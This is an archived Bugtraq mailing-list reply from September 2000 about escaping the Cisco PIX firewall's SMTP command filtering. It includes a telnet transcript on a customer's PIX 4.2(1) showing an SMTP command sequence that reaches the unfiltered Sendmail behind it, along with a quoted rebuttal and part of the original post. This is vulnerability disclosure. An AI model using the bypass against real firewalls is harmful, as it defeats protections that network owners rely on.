@@ -1,0 +1,187 @@
+Bugtraq: Re: Cisco PIX Firewall (smtp content filtering hack) - Version 4.2(1) not exploitable 
+
+ Nmap Security Scanner 
+
+ Intro 
+
+ Ref Guide 
+
+ Install Guide 
+
+ Download 
+
+ Changelog 
+
+ Book 
+
+ Docs 
+
+ Security Lists 
+
+ Nmap Hackers 
+
+ Nmap Dev 
+
+ Bugtraq 
+
+ Full Disclosure 
+
+ Pen Test 
+
+ Basics 
+
+ More 
+
+ Security Tools 
+
+ Pass crackers 
+
+ Sniffers 
+
+ Vuln Scanners 
+
+ Web scanners 
+
+ Wireless 
+
+ Exploitation 
+
+ Packet crafters 
+
+ More 
+
+ Site News 
+
+ Advertising 
+
+ About/Contact 
+
+ Exceptional Links 
+
+ Good Reading 
+
+-->
+ Exploit World 
+
+ Sponsors: 
+
+ Bugtraq 
+mailing list archives 
+
+    By Date    
+
+    By Thread    
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) - Version 4.2(1) not exploitable 
+
+ From : "Fabio Pietrosanti (naif)" <naif () INET IT>
+
+ Date : Wed, 20 Sep 2000 10:34:44 +0200
+
+ -----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Work also on 4.2(1),
+It's normal that you'll receive an error like this, but after you can
+inject any command you wish without having them filtered.
+
+This is a session on a customer's 4.2(1) pix .
+
+Trying...
+Connected to xxx.xxx.xxx.xxx.
+Escape character is '^]'.
+220 SMTP/cmap
+ready_______________________________________________________________
+help
+500 Command unrecognized: "XXXX"
+data
+503 Need MAIL command
+help
+214-This is Sendmail version 8.9.3
+214-Topics:
+214- HELO EHLO MAIL RCPT DATA
+214- RSET NOOP QUIT HELP VRFY
+214- EXPN VERB ETRN DSN
+214-For more info use "HELP <topic>".
+214-To report bugs in the implementation send email to
+214- sendmail-bugs () sendmail org 
+214-For local information send email to Postmaster at your site.
+214 End of HELP info
+quit
+221 to.protect.customer.it closing connection
+Connection closed.
+
+e-mail: naif () inet it ( Direzione Tecnica, Gruppo Firewall )
+PGP Key (DSS) http://naif.itapac.net/naif.asc 
+ --
+Free advertising: www.openbsd.org - Multiplatform Ultra-secure OS
+
+On Wed, 20 Sep 2000, Leandro Dardini wrote:
+
+ I test my (old) pix box running 4.2(1) and it is not exploitable.
+When I try to not complete my smtp session, issuing a "data" command before
+rcpt, I receive a
+503 Need RCPT (recipient)
+message.
+I test other permutation of helo, mail, rcpt, data command but all fails.
+
+Leandro
+
+----- Original Message -----
+From: naif <naif () INET IT>
+To: <BUGTRAQ () SECURITYFOCUS COM>
+Sent: Tuesday, September 19, 2000 6:27 PM
+Subject: Cisco PIX Firewall (smtp content filtering hack)
+
+ -----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+How to escape "fixup smtp" of Cisco Pix Firewall:
+
+The Cisco Pix Firewall normally restrict some protocol
+ command(http,ftp,smtp) and manage
+ multisession protocol(h323, ftp,sqlnet) .
+I made some test on a BSDI3.0 running sendmail9 placed in the dmz .
+The Pix version it's the latest, 5.2(1)... here the output of "show ver"
+=====================================================
+Cisco Secure PIX Firewall Version 5.2(1)
+
+ -----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.0.1 (GNU/Linux)
+Comment: For info see http://www.gnupg.org 
+Filter: gpg4pine 4.1 ( http://azzie.robotics.net )
+
+iD8DBQE5yHandK5I1NnlcMYRAuRBAJ9y/ERWAjmFwveV8B3Iw3poz/n0wwCfYma6
++mnW4XsdeFiTQjlcfEQs2JA=
+=2Pog
+-----END PGP SIGNATURE-----
+
+    By Date    
+
+    By Thread    
+
+ Current thread: 
+
+ Cisco PIX Firewall (smtp content filtering hack) naif (Sep 19) 
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) Lisa Napier (Sep 20) 
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) Jeffrey W. Baker (Sep 21) 
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) Deus, Attonbitus (Sep 21) 
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) Signal 11 (Sep 22) 
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) - Version 4.2(1) not exploitable Leandro Dardini (Sep 20) 
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) - Version 4.2(1) not exploitable Fabio Pietrosanti (naif) (Sep 20) 
+
+ Re: Cisco PIX Firewall (smtp content filtering hack) Ioannis Migadakis (Sep 21) 
+
+[ Nmap |
+ Sec Tools |
+ Mailing Lists |
+ Site News |
+ About/Contact |
+ Advertising |
+ Privacy ]
